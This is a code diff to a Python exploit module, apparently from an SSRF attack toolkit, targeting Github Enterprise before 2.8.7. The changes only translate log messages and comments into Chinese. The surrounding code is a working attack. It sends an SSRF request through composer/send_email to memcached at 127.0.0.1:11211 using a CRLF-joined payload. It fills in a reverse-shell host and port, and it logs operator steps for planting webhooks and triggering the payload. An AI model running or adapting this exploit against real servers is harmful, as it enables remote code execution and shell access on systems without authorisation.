@@ -4,7 +4,7 @@ import urllib.parse
 from core.utils import *
 
 name = "github"
-description = "Github Enterprise RCE < 2.8.7"
+description = "Github Enterprise 远程代码执行（RCE，版本 < 2.8.7）"
 author = "Orange"
 documentation = [
     "https://www.exploit-db.com/exploits/42392/",
@@ -14,9 +14,9 @@ documentation = [
 
 class exploit:
     def __init__(self, requester, args):
-        logging.info(f"Module '{name}' launched !")
+        logging.info(f"模块 '{name}' 已启动！")
 
-        # Data for the service
+        # 服务数据
         ip = "0"
         port = "8000"
         data = "composer/send_email?to=orange@chroot.org&url=http://127.0.0.1:11211/"
@@ -35,19 +35,19 @@ class exploit:
         payload = map(urllib.parse.quote, payload)
         payload = wrapper_http(data + "%0D%0A".join(payload), ip, port)
 
-        # Handle args for reverse shell
+        # 处理反弹 shell 参数
         if args.lhost == None:
-            payload = payload.replace("SERVER_HOST", input("Server Host:"))
+            payload = payload.replace("SERVER_HOST", input("服务器主机:"))
         else:
             payload = payload.replace("SERVER_HOST", args.lhost)
 
         if args.lport == None:
-            payload = payload.replace("SERVER_PORT", input("Server Port:"))
+            payload = payload.replace("SERVER_PORT", input("服务器端口:"))
         else:
             payload = payload.replace("SERVER_PORT", args.lport)
 
         logging.info(
-            "You need to insert the WebHooks in 'https://ghe-server/:user/:repo/settings/hooks'"
+            "你需要在 'https://ghe-server/:user/:repo/settings/hooks' 中插入 WebHooks"
         )
-        logging.info("Then make a request to 'https://ghe-server/search?q=ggggg&type=Repositories'")
+        logging.info("然后请求 'https://ghe-server/search?q=ggggg&type=Repositories'")
         logging.info(f"Payload : {payload}")
